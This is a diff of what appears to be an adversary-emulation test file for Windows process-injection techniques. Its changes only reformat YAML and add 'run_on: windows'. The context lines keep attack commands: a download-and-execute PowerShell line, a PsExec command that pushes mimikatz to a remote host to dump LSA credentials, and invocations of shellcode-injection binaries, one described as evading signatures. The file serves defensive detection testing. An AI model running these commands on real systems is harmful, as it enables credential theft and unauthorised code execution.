@@ -42,6 +42,8 @@ atomic_tests:
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
       Invoke-Maldoc -macroFile "#{txt_path}" -officeProduct "Word" -sub "Execute"
     name: powershell
+  run_on:
+  - windows
 - name: Remote Process Injection in LSASS via mimikatz
   auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
   description: |
@@ -64,7 +66,7 @@ atomic_tests:
     psexec_path:
       description: Path to PsExec
       type: string
-      default: 'PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe'
+      default: PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -96,6 +98,8 @@ atomic_tests:
       "#{psexec_path}" /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
     name: command_prompt
     elevation_required: false # locally not, but remotely on target machine then yes
+  run_on:
+  - windows
 - name: Section View Injection
   auto_generated_guid: c6952f41-6cf0-450a-b352-2ca8dae7c178
   description: |
@@ -110,6 +114,8 @@ atomic_tests:
       Start-Process "$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe"
     cleanup_command: Stop-Process $notepad.pid
     name: powershell
+  run_on:
+  - windows
 - name: Dirty Vanity process Injection
   auto_generated_guid: 49543237-25db-497b-90df-d0a0a6e8fe2c
   description: |
@@ -126,9 +132,12 @@ atomic_tests:
   executor:
     command: |
       Start-Process "$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe" #{pid}
-    cleanup_command: 'Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force'
+    cleanup_command: Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue
+      | Stop-Process -Force
     name: powershell
     elevation_required: false
+  run_on:
+  - windows
 - name: Read-Write-Execute process Injection
   auto_generated_guid: 0128e48e-8c1a-433a-a11a-a5387384f1e1
   description: |
@@ -143,7 +152,7 @@ atomic_tests:
   - windows
   input_arguments:
     vuln_dll:
-      description: vulnerable DLL 
+      description: vulnerable DLL
       type: path
       default: PathToAtomicsFolder\T1055\bin\x64\vuln_dll\msys-2.0.dll
   dependency_executor_name: powershell
@@ -159,9 +168,12 @@ atomic_tests:
     command: |
       $address = (& "$PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe" "$PathToAtomicsFolder\T1055\bin\x64\vuln_dll\" | Out-String | Select-String -Pattern "VirtualAddress: (\w+)").Matches.Groups[1].Value
       & "PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe" "#{vuln_dll}" $address
-    cleanup_command: 'Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force'
+    cleanup_command: Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process
+      -Force
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Process Injection with Go using UuidFromStringA WinAPI
   auto_generated_guid: 2315ce15-38b6-46ac-a3eb-5e21abef2545
   description: |
@@ -180,7 +192,9 @@ atomic_tests:
     command: |
       $PathToAtomicsFolder\T1055\bin\x64\UuidFromStringA.exe -debug
     cleanup_command: |
-       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+      Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+  run_on:
+  - windows
 - name: Process Injection with Go using EtwpCreateEtwThread WinAPI
   auto_generated_guid: 7362ecef-6461-402e-8716-7410e1566400
   description: |
@@ -206,7 +220,9 @@ atomic_tests:
     command: |
       $PathToAtomicsFolder\T1055\bin\x64\EtwpCreateEtwThread.exe -debug
     cleanup_command: |
-       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+      Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+  run_on:
+  - windows
 - name: Remote Process Injection with Go using RtlCreateUserThread WinAPI
   auto_generated_guid: a0c1725f-abcd-40d6-baac-020f3cf94ecd
   description: |
@@ -229,7 +245,7 @@ atomic_tests:
     spawn_process_path:
       description: Path of the binary to spawn
       type: string
-      default: 'C:\Windows\System32\werfault.exe'
+      default: C:\Windows\System32\werfault.exe
     spawn_process_name:
       description: Name of the process spawned
       type: string
@@ -241,8 +257,10 @@ atomic_tests:
       $process = Start-Process #{spawn_process_path} -passthru
       $PathToAtomicsFolder\T1055\bin\x64\RtlCreateUserThread.exe -pid $process.Id -debug
     cleanup_command: |
-       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
-       Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
+      Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+      Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
+  run_on:
+  - windows
 - name: Remote Process Injection with Go using CreateRemoteThread WinAPI
   auto_generated_guid: 69534efc-d5f5-4550-89e6-12c6457b9edd
   description: |
@@ -267,7 +285,7 @@ atomic_tests:
     spawn_process_path:
       description: Path of the binary to spawn
       type: string
-      default: 'C:\Windows\System32\werfault.exe'
+      default: C:\Windows\System32\werfault.exe
     spawn_process_name:
       description: Name of the process spawned
       type: string
@@ -279,8 +297,10 @@ atomic_tests:
       $process = Start-Process #{spawn_process_path} -passthru
       $PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug
     cleanup_command: |
-       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
-       Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
+      Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+      Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
+  run_on:
+  - windows
 - name: Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively)
   auto_generated_guid: 2a4ab5c1-97ad-4d6d-b5d3-13f3a6c94e39
   description: |
@@ -302,7 +322,7 @@ atomic_tests:
     spawn_process_path:
       description: Path of the binary to spawn
       type: string
-      default: 'C:\Windows\System32\werfault.exe'
+      default: C:\Windows\System32\werfault.exe
     spawn_process_name:
       description: Name of the process spawned
       type: string
@@ -314,8 +334,10 @@ atomic_tests:
       $process = Start-Process #{spawn_process_path} -passthru
       $PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug
     cleanup_command: |
-       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
-       Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
+      Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+      Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue
+  run_on:
+  - windows
 - name: Process Injection with Go using CreateThread WinAPI
   auto_generated_guid: 2871ed59-3837-4a52-9107-99500ebc87cb
   description: |
@@ -337,7 +359,9 @@ atomic_tests:
     command: |
       $PathToAtomicsFolder\T1055\bin\x64\CreateThread.exe -debug
     cleanup_command: |
-       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+      Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+  run_on:
+  - windows
 - name: Process Injection with Go using CreateThread WinAPI (Natively)
   auto_generated_guid: 2a3c7035-d14f-467a-af94-933e49fe6786
   description: |
@@ -359,14 +383,16 @@ atomic_tests:
     command: |
       $PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe -debug
     cleanup_command: |
-       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+      Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
+  run_on:
+  - windows
 - name: UUID custom process Injection
   auto_generated_guid: 0128e48e-8c1a-433a-a11a-a5304734f1e1
   description: |
     The UUIDs Process Injection code was first introduced by the NCC Group. The code can be stored in UUID forms on the heap and converted back to binary via UuidFromStringA at runtime. In this new custom version of UUID injection, EnumSystemLocalesA is the only API called to execute the code. We used custom UuidToString and UuidFromString implementations to avoid using UuidFromStringA and RPCRT4.dll, thereby eliminating the static signatures. This technique also avoided the use of VirtualAlloc, WriteProcessMemory and CreateThread
-    
+
     The injected shellcode will open a message box and a notepad.
-    
+
     Reference to NCC Group: https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
     Concept from: http://ropgadget.com/posts/abusing_win_functions.html
   supported_platforms:
@@ -390,6 +416,9 @@ atomic_tests:
       Start-Process "#{exe_binary}"
       Start-Sleep -Seconds 7
       Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
-    cleanup_command: 'Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force'
+    cleanup_command: Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process
+      -Force
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
